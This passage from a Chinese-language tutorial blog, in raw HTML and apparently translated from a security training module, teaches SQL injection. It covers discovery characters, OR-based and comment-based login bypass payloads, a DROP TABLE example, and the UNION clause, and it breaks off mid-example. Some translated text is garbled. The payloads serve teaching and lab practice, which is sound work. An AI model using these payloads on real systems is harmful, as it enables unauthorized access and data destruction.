php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"variable\">$row</span> = <span class=\"variable\">$result</span>-&gt;<span class=\"title function_ invoke__\">fetch_assoc</span>() )&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"variable\">$row</span>[<span class=\"string\">&quot;name&quot;</span>].<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Web 应用程序在检索数据时通常也使用用户输入。例如，当用户使用搜索功能搜索其他用户时，他们的搜索输入将传递给 Web 应用程序，该应用程序使用输入在数据库中进行搜索：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$searchInput</span> =  <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;findUser&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$query</span> = <span class=\"string\">&quot;select * from logins where username like &#x27;%<span class=\"subst\">$searchInput</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$conn</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$query</span>);</span><br><span class=\"line\">If we <span class=\"keyword\">use</span> <span class=\"title\">user</span>-<span class=\"title\">input</span> <span class=\"title\">within</span> <span class=\"title\">an</span> <span class=\"title\">SQL</span> <span class=\"title\">query</span>, <span class=\"title\">and</span> <span class=\"title\">if</span> <span class=\"title\">not</span> <span class=\"title\">securely</span> <span class=\"title\">coded</span>, <span class=\"title\">it</span> <span class=\"title\">may</span> <span class=\"title\">cause</span> <span class=\"title\">a</span> <span class=\"title\">variety</span> <span class=\"title\">of</span> <span class=\"title\">issues</span>, <span class=\"title\">like</span> <span class=\"title\">SQL</span> <span class=\"title\">Injection</span> <span class=\"title\">vulnerabilities</span>.</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"什么是注射？\"><a href=\"#什么是注射？\" class=\"headerlink\" title=\"什么是注射？\"></a>什么是注射？</h3><p>在上面的示例中，我们接受用户输入并将其直接传递给 SQL 查询而不进行清理。</p>\n<p>清理是指删除用户输入中的任何特殊字符，以中断任何注入尝试。</p>\n<p>当应用程序将用户输入错误解释为实际代码而不是字符串时，就会发生注入，从而更改代码流并执行它。这可以通过注入特殊字符（如 ( <code>&#39;</code>)）来转义用户输入边界，然后编写要执行的代码（如 JavaScript 代码或 SQL 注入中的 SQL）来实现。除非对用户输入进行清理，否则很可能会执行注入的代码并运行它。</p>\n<hr>\n<h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><p>当用户输入被输入到 SQL 查询字符串中而没有正确清理或过滤输入时，就会发生 SQL 注入。前面的示例展示了如何在 SQL 查询中使用用户输入，并且它没有使用任何形式的输入清理：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$searchInput</span> =  <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;findUser&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$query</span> = <span class=\"string\">&quot;select * from logins where username like &#x27;%<span class=\"subst\">$searchInput</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$conn</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$query</span>);</span><br></pre></td></tr></table></figure>\n\n<p>在典型情况下，<code>searchInput</code>将输入 以完成查询，返回预期结果。我们键入的任何输入都会进入以下 SQL 查询：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> logins <span class=\"keyword\">where</span> username <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%$searchInput&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>所以，如果我们输入<code>admin</code>，它变成<code>&#39;%admin&#39;</code>。在这种情况下，如果我们编写任何 SQL 代码，它只会被视为搜索词。例如，如果我们输入<code>SHOW DATABASES;</code>，它将被执行为<code>&#39;%SHOW DATABASES;&#39;</code>Web 应用程序将搜索类似于 的用户名<code>SHOW DATABASES;</code>。但是，由于没有清理，在这种情况下，<strong>我们可以添加一个单引号 ( <code>&#39;</code>)，它将结束用户输入字段，然后我们可以编写实际的 SQL 代码</strong>。例如，如果我们搜索<code>1&#39;; DROP TABLE users;</code>，搜索输入将是：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;%1&#x27;</span>; DROP TABLE users;<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>请注意我们如何在“1”之后添加单引号 (‘)，以避开用户输入 (‘%$searchInput’) 的范围。</p>\n<p>因此，最终执行的 SQL 查询如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> logins <span class=\"keyword\">where</span> username <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%1&#x27;</span>; <span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> users;<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>正如我们从语法突出显示中看到的那样，我们可以转义原始查询的边界并执行新注入的查询。<code>Once the query is run, the </code>用户<code> table will get deleted.</code></p>\n<p>注意：在上面的示例中，为了简单起见，我们在分号（;）之后添加了另一个 SQL 查询。虽然这对于 MySQL 实际上是不可能的，但对于 MSSQL 和 PostgreSQL 是可能的。在接下来的部分中，我们将讨论在 MySQL 中注入 SQL 查询的真正方法。</p>\n<hr>\n<h3 id=\"语法错误\"><a href=\"#语法错误\" class=\"headerlink\" title=\"语法错误\"></a>语法错误</h3><p>前面的 SQL 注入示例将返回错误：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Error</span>: near line <span class=\"number\">1</span>: near <span class=\"string\">&quot;&#x27;&quot;</span>: syntax error</span><br></pre></td></tr></table></figure>\n\n<p>这是因为最后一个尾随字符，我们有一个<code>&#39;</code>没有关闭的额外引号 ()，这会导致执行时出现 SQL 语法错误：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> logins <span class=\"keyword\">where</span> username <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%1&#x27;</span>; <span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> users;<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>在这种情况下，我们只有一个尾随字符，因为我们的搜索查询输入接近 SQL 查询的末尾。然而，用户输入通常在 SQL 查询的中间，原始 SQL 查询的其余部分在它之后。</p>\n<p>要成功注入，我们必须确保新修改的 SQL 查询在注入后仍然有效并且没有任何语法错误。在大多数情况下，我们无法访问源代码来查找原始 SQL 查询并开发适当的 SQL 注入来进行有效的 SQL 查询。那么，我们如何才能成功地注入到 SQL 查询中呢？</p>\n<p>一个答案是使用<code>comments</code>，我们将在后面的部分讨论这个问题。另一种方法是通过传入多个单引号使查询语法起作用，我们将在接下来讨论 ( <code>&#39;</code>)。</p>\n<p>现在我们了解了 SQL 注入的基础知识，让我们开始学习一些实际用途。</p>\n<hr>\n<h3 id=\"SQL注入的类型\"><a href=\"#SQL注入的类型\" class=\"headerlink\" title=\"SQL注入的类型\"></a>SQL注入的类型</h3><p>SQL 注入根据我们检索其输出的方式和位置进行分类。</p>\n<p><img src=\"https://p.ipic.vip/p4s9ku.jpg\" alt=\"数据库管理系统架构\"></p>\n<p>在简单的情况下，预期和新查询的输出可能会直接打印在前端，我们可以直接读取。这称为<code>In-band</code>SQL 注入，它有两种类型：<code>Union Based</code>和<code>Error Based</code>。</p>\n<p>使用<code>Union Based</code>SQL 注入，我们可能必须指定我们可以读取的确切位置，即“列”，以便查询将输出定向到那里打印。至于SQL 注入，当我们可以在前端<code>Error Based</code>获取<code>PHP</code>或错误时使用它，因此我们可能会故意导致返回查询输出的 SQL 错误。<code>SQL</code></p>\n<p>在更复杂的情况下，我们可能无法打印输出，因此我们可以利用 SQL 逻辑逐个字符地检索输出。这称为<code>Blind</code>SQL 注入，它也有两种类型：<code>Boolean Based</code>和<code>Time Based</code>。</p>\n<p>通过<code>Boolean Based</code>SQL 注入，我们可以使用 SQL 条件语句来控制页面是否返回任何输出，“即原始查询响应”，如果我们的条件语句返回<code>true</code>。对于<code>Time Based</code>SQL 注入，我们使用 SQL 条件语句，如果条件语句<code>true</code>使用<code>Sleep()</code>函数返回，则延迟页面响应。</p>\n<p>最后，在某些情况下，我们可能无法直接访问输出，因此我们可能必须将输出定向到远程位置，“即 DNS 记录”，然后尝试从那里检索它。这称为<code>Out-of-band</code>SQL 注入。</p>\n<p>在本模块中，我们将只专注于通过学习 SQL 注入来介绍<code>Union Based</code>SQL 注入。</p>\n<h2 id=\"0x05-颠覆查询逻辑\"><a href=\"#0x05-颠覆查询逻辑\" class=\"headerlink\" title=\"0x05 颠覆查询逻辑\"></a>0x05 颠覆查询逻辑</h2><hr>\n<p>现在我们对 SQL 语句的工作原理有了基本的了解，让我们开始 SQL 注入。在我们开始执行整个 SQL 查询之前，我们将首先学习通过注入运算符<code>OR</code>和使用 SQL 注释来颠覆原始查询逻辑来修改原始查询。这方面的一个基本示例是绕过 Web 身份验证，我们将在本节中对此进行演示。</p>\n<hr>\n<h3 id=\"身份验证绕过\"><a href=\"#身份验证绕过\" class=\"headerlink\" title=\"身份验证绕过\"></a>身份验证绕过</h3><p>考虑以下管理员登录页面。</p>\n<p><img src=\"https://p.ipic.vip/v1wx7o.png\" alt=\"管理面板\"></p>\n<p>我们可以使用管理员凭据登录<code>admin / p@ssw0rd</code>。</p>\n<p><img src=\"https://p.ipic.vip/rr2k1g.png\" alt=\"admin_creds\"></p>\n<p>该页面还显示了正在执行的 SQL 查询，以便更好地了解我们将如何颠覆查询逻辑。我们的目标是在不使用现有密码的情况下以管理员用户身份登录。正如我们所见，当前正在执行的 SQL 查询是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> logins <span class=\"keyword\">WHERE</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span> <span class=\"keyword\">AND</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;p@ssw0rd&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>该页面接收凭据，然后使用<code>AND</code>运算符选择与给定用户名和密码匹配的记录。如果<code>MySQL</code>数据库返回匹配的记录，则凭据有效，因此代码<code>PHP</code>会将登录尝试条件评估为<code>true</code>。如果条件评估为<code>true</code>，则返回管理员记录，并验证我们的登录。让我们看看当我们输入错误的凭据时会发生什么。</p>\n<p><img src=\"https://p.ipic.vip/wiuu1q.png\" alt=\"管理员不正确\"></p>\n<p>不出所料，由于密码错误导致<code>false</code>操作结果导致登录失败<code>AND</code>。</p>\n<hr>\n<h3 id=\"SQLi-发现\"><a href=\"#SQLi-发现\" class=\"headerlink\" title=\"SQLi 发现\"></a>SQLi 发现</h3><p>在我们开始破坏 Web 应用程序的逻辑并试图绕过身份验证之前，我们首先必须测试登录表单是否容易受到 SQL 注入的攻击。为此，我们将尝试在我们的用户名后添加以下有效负载之一，看看它是否会导致任何错误或改变页面的行为方式：</p>\n<table>\n<thead>\n<tr>\n<th>有效载荷</th>\n<th>网址编码</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>&#39;</code></td>\n<td><code>%27</code></td>\n</tr>\n<tr>\n<td><code>&quot;</code></td>\n<td><code>%22</code></td>\n</tr>\n<tr>\n<td><code>#</code></td>\n<td><code>%23</code></td>\n</tr>\n<tr>\n<td><code>;</code></td>\n<td><code>%3B</code></td>\n</tr>\n<tr>\n<td><code>)</code></td>\n<td><code>%29</code></td>\n</tr>\n</tbody></table>\n<p>注意：在某些情况下，我们可能必须使用负载的 URL 编码版本。这方面的一个例子是当我们将我们的有效负载直接放在 URL“即 HTTP GET 请求”中时。</p>\n<p>因此，让我们从注入单引号开始：</p>\n<p><img src=\"https://p.ipic.vip/j8ps1w.png\" alt=\"报价错误\"></p>\n<p>我们看到抛出了 SQL 错误而不是<code>Login Failed</code>消息。该页面引发错误，因为生成的查询是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> logins <span class=\"keyword\">WHERE</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;&#x27;&#x27; AND password = &#x27;</span>something<span class=\"string\">&#x27;;</span></span><br></pre></td></tr></table></figure>\n\n<p>如上一节所述，我们输入的引号导致了奇数个引号，从而导致语法错误。一种选择是注释掉查询的其余部分，并将查询的其余部分作为我们注入的一部分来编写，以形成一个有效的查询。另一种选择是在我们注入的查询中使用偶数个引号，这样最终的查询仍然有效。</p>\n<hr>\n<h3 id=\"或注射\"><a href=\"#或注射\" class=\"headerlink\" title=\"或注射\"></a>或注射</h3><p><code>true</code>无论输入的用户名和密码如何，我们都需要查询始终返回，以绕过身份验证。为此，我们可以<code>OR</code>在 SQL 注入中滥用运算符。</p>\n<p>如前所述，<a href=\"https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html\">操作优先级的</a>MySQL 文档指出<code>AND</code>操作符将在操作符之前被评估<code>OR</code>。<code>TRUE</code>这意味着如果整个查询中至少有一个条件和一个<code>OR</code>运算符，则整个查询的计算结果将是 to <code>TRUE</code>，因为如果其操作数之一是 ，<code>OR</code>则运算符返回。<code>TRUE``TRUE</code></p>\n<p>始终返回的条件示例<code>true</code>是<code>&#39;1&#39;=&#39;1&#39;</code>。但是，为了保持 SQL 查询正常工作并保持偶数个引号，而不是使用 (‘1’&#x3D;’1’)，我们将删除最后一个引号并使用 (‘1’&#x3D;’1)，因此剩下的单引号原始查询中的引用将取而代之。</p>\n<p>因此，如果我们注入以下条件并<code>OR</code>在它和原始条件之间有一个运算符，它应该总是返回<code>true</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin<span class=\"string\">&#x27; or &#x27;</span><span class=\"number\">1</span><span class=\"string\">&#x27;=&#x27;</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>最终查询应如下所示：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> logins <span class=\"keyword\">WHERE</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span> <span class=\"keyword\">or</span> <span class=\"string\">&#x27;1&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">AND</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;something&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>这意味着以下内容：</p>\n<ul>\n<li>如果用户名是<code>admin</code><br><code>OR</code></li>\n<li>如果<code>1=1</code>返回<code>true</code>‘总是返回<code>true</code>‘<br><code>AND</code></li>\n<li>如果密码是<code>something</code></li>\n</ul>\n<p><img src=\"https://p.ipic.vip/z4rxm0.png\" alt=\"or_inject_diagram\"></p>\n<p>运算<code>AND</code>符将首先被评估，然后返回<code>false</code>。然后，<code>OR</code>运算符将被评估，如果其中一个语句是<code>true</code>，它将返回<code>true</code>。由于<code>1=1</code>总是返回<code>true</code>，此查询将返回<code>true</code>，并且它会授予我们访问权限。</p>\n<p>注意：我们上面使用的有效载荷是我们可以用来破坏身份验证逻辑的众多身份验证绕过有效载荷之一。[您可以在PayloadAllTheThings](<a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL</a> Injection#authentication-bypass)中找到完整的 SQLi 身份验证绕过负载列表，每个负载都适用于特定类型的 SQL 查询。</p>\n<hr>\n<h3 id=\"使用-OR-运算符绕过身份验证\"><a href=\"#使用-OR-运算符绕过身份验证\" class=\"headerlink\" title=\"使用 OR 运算符绕过身份验证\"></a>使用 OR 运算符绕过身份验证</h3><p>让我们尝试将此作为用户名并查看响应。 <img src=\"https://p.ipic.vip/axfg4d.png\" alt=\"注入成功\"></p>\n<p>我们能够以管理员身份成功登录。但是，如果我们不知道有效的用户名怎么办？这次让我们用不同的用户名尝试相同的请求。</p>\n<p><img src=\"https://p.ipic.vip/227o29.png\" alt=\"notadmin_fail\"></p>\n<p>登录失败，因为<code>notAdmin</code>表中不存在，导致整体查询错误。</p>\n<p><img src=\"https://p.ipic.vip/l1tx6e.png\" alt=\"notadmin_diagram\"></p>\n<p>要再次成功登录，我们需要一个整体<code>true</code>查询。这可以通过<code>OR</code>在密码字段中注入一个条件来实现，因此它总是会返回<code>true</code>。让我们尝试<code>something&#39; or &#39;1&#39;=&#39;1</code>作为密码。</p>\n<p><img src=\"https://p.ipic.vip/6me5id.png\" alt=\"密码或注入\"></p>\n<p>附加<code>OR</code>条件导致<code>true</code>整体查询，因为该<code>WHERE</code>子句返回表中的所有内容，并且第一行中的用户已登录。在这种情况下，由于两个条件都将返回，<code>true</code>我们不必提供测试用户名和密码，可以直接开始注入<code>&#39;</code>，直接用<code>&#39; or &#39;1&#39; = &#39;1</code>.</p>\n<p><img src=\"https://p.ipic.vip/a4r69u.png\" alt=\"basic_auth_bypass\"></p>\n<p>这是有效的，因为查询的计算结果与<code>true</code>用户名或密码无关。</p>\n<h2 id=\"0x06-使用注释\"><a href=\"#0x06-使用注释\" class=\"headerlink\" title=\"0x06 使用注释\"></a>0x06 使用注释</h2><p>本节将介绍如何使用注释来颠覆更高级的 SQL 查询的逻辑，并最终得到一个有效的 SQL 查询来绕过登录身份验证过程。</p>\n<hr>\n<h3 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h3><p>就像任何其他语言一样，SQL 也允许使用注释。注释用于记录查询或忽略查询的特定部分。除了内联注释外，我们还可以在 MySQL<code>-- </code>和中使用两种类型的行注释（尽管这通常不用于 SQL 注入）。可以按如下方式使用：<code>#``/**/``--</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT username FROM logins; -- Selects usernames from the logins table </span><br><span class=\"line\"></span><br><span class=\"line\">+---------------+</span><br><span class=\"line\">| username      |</span><br><span class=\"line\">+---------------+</span><br><span class=\"line\">| admin         |</span><br><span class=\"line\">| administrator |</span><br><span class=\"line\">| john          |</span><br><span class=\"line\">| tom           |</span><br><span class=\"line\">+---------------+</span><br><span class=\"line\">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>注意：在 SQL 中，仅使用两个破折号不足以开始注释。所以，它们后面必须有一个空格，所以注释以 (– ) 开头，末尾有一个空格。有时 URL 编码为 (–+)，因为 URL 中的空格被编码为 (+)。为清楚起见，我们将在末尾 (– -) 添加另一个 (-)，以显示空格字符的使用。</p>\n<p>符号<code>#</code>也可以使用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT * FROM logins WHERE username = &#x27;admin&#x27;; ## You can place anything here AND password = &#x27;something&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">+----+----------+----------+---------------------+</span><br><span class=\"line\">| id | username | password | date_of_joining     |</span><br><span class=\"line\">+----+----------+----------+---------------------+</span><br><span class=\"line\">|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |</span><br><span class=\"line\">+----+----------+----------+---------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>提示：如果您在浏览器的 URL 中输入有效负载，(#) 符号通常被视为标记，不会作为 URL 的一部分传递。为了在浏览器中使用 (#) 作为注释，我们可以使用 ‘%23’，这是一个 URL 编码 (#) 符号。</p>\n<p>服务器将在评估期间忽略查询的部分<code>AND password = &#39;something&#39;</code>。</p>\n<hr>\n<h3 id=\"带有注释的身份验证绕过\"><a href=\"#带有注释的身份验证绕过\" class=\"headerlink\" title=\"带有注释的身份验证绕过\"></a>带有注释的身份验证绕过</h3><p>让我们回到我们之前的例子并注入<code>admin&#39;-- </code>我们的用户名。最终查询将是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> logins <span class=\"keyword\">WHERE</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span><span class=\"comment\">-- &#x27; AND password = &#x27;something&#x27;;</span></span><br></pre></td></tr></table></figure>\n\n<p>正如我们从语法突出显示中看到的那样，用户名现在是<code>admin</code>，查询的其余部分现在作为注释被忽略。此外，通过这种方式，我们可以确保查询没有任何语法问题。</p>\n<p><code>admin&#39;-- </code>让我们尝试在登录页面上使用这些，并使用用户名和任何密码登录：</p>\n<p><img src=\"https://p.ipic.vip/sqgtxx.png\" alt=\"admin_dash\"></p>\n<p>如我们所见，我们能够绕过身份验证，因为新修改的查询会检查用户名，没有其他条件。</p>\n<hr>\n<h3 id=\"另一个例子\"><a href=\"#另一个例子\" class=\"headerlink\" title=\"另一个例子\"></a>另一个例子</h3><p>如果应用程序需要先检查特定条件，SQL 支持使用括号。括号内的表达式优先于其他运算符并首先计算。让我们来看这样一个场景：</p>\n<p><img src=\"https://p.ipic.vip/7qr0qc.png\" alt=\"paranthesis_fail\"></p>\n<p>上面的查询确保用户的 id 总是大于 1，这将阻止任何人以管理员身份登录。此外，我们还看到密码在用于查询之前已经过哈希处理。这将阻止我们通过密码字段进行注入，因为输入已更改为哈希。</p>\n<p>让我们尝试使用有效凭据登录<code>admin / p@ssw0rd</code>以查看响应。</p>\n<p><img src=\"https://p.ipic.vip/fa2q4c.png\" alt=\"paranthesis_valid_fail\"></p>\n<p>正如预期的那样，即使我们提供了有效的凭据，登录也会失败，因为管理员的 ID 等于 1。因此让我们尝试使用另一个用户的凭据登录，例如<code>tom</code>。</p>\n<p><img src=\"https://p.ipic.vip/r9086n.png\" alt=\"tom_login\"></p>\n<p>以 id 不等于 1 的用户身份登录成功。那么，我们如何以管理员身份登录呢？从前面关于注释的部分我们知道我们可以使用它们来注释查询的其余部分。因此，让我们尝试使用<code>admin&#39;-- </code>as 用户名。</p>\n<p><img src=\"https://p.ipic.vip/e5z9ah.png\" alt=\"paranthesis_error\"></p>\n<p>由于语法错误，登录失败，因为关闭的没有平衡开括号。要成功执行查询，我们必须添加一个右括号。让我们尝试使用用户名<code>admin&#39;)-- </code>关闭并注释掉其余部分。</p>\n<p><img src=\"https://p.ipic.vip/tf4imk.png\" alt=\"paranthesis_success\"></p>\n<p>查询成功，我们以管理员身份登录。我们输入的最终查询是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> logins <span class=\"keyword\">where</span> (username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x07-Union-Clause\"><a href=\"#0x07-Union-Clause\" class=\"headerlink\" title=\"0x07 Union Clause\"></a>0x07 Union Clause</h2><p>到目前为止，我们只是在操纵原始查询来颠覆 Web 应用程序逻辑并绕过身份验证，使用运算符<code>OR</code>和注释。然而，另一种类型的 SQL 注入是注入与原始查询一起执行的整个 SQL 查询。本节将通过使用 MySQL<code>Union</code>子句来演示这一点<code>SQL Union Injection</code>。</p>\n<hr>\n<h3 id=\"Union\"><a href=\"#Union\" class=\"headerlink\" title=\"Union\"></a>Union</h3><p>在开始学习 Union Injection 之前，我们应该先了解一下 SQL Union 子句。<a href=\"https://dev.mysql.com/doc/refman/8.0/en/union.html\">Union</a>子句用于组合多个<code>SELECT</code>语句的结果。这意味着通过<code>UNION</code>注入，我们将能够<code>SELECT</code>从多个表和数据库中跨 DBMS 转储和转储数据。让我们尝试<code>UNION</code>在示例数据库中使用运算符。首先，让我们看一下表的内容<code>ports</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT * FROM ports;</span><br><span class=\"line\"></span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| code     | city      |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| CN SHA   | Shanghai  |</span><br><span class=\"line\">| SG SIN   | Singapore |</span><br><span class=\"line\">| ZZ-21    | Shenzhen  |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>接下来，让我们看看表的输出<code>ships</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT * FROM ships;</span><br><span class=\"line\"></span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| Ship     | city      |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| Morrison | New York  |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">1 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>现在，让我们尝试使用<code>UNION</code>组合两个结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT * FROM ports UNION SELECT * FROM ships;</span><br><span class=\"line\"></span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| code     | city      |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| CN SHA   | Shanghai  |</span><br><span class=\"line\">| SG SIN   | Singapore |</span><br><span class=\"line\">| Morrison | New York  |</span><br><span class=\"line\">| ZZ-21    | Shenzhen  |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>如我们所见，<code>UNION</code>将两个语句的输出合并<code>SELECT</code>为一个，因此表中的条目<code>ports</code>和<code>ships</code>表中的条目合并为具有四行的单个输出。正如我们所看到的，一些行属于表，<code>ports</code>而另一些行属于<code>ships</code>表。</p>\n<p>注意：所有位置上所选列的数据类型应相同。</p>\n<hr>\n<h3 id=\"偶数列\"><a href=\"#偶数列\" class=\"headerlink\" title=\"偶数列\"></a>偶数列</h3><p>一条<code>UNION</code>语句只能对<code>SELECT</code>具有相同列数的语句进行操作。例如，如果我们尝试<code>UNION</code>两个具有不同列数的结果的查询，我们会收到以下错误：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span 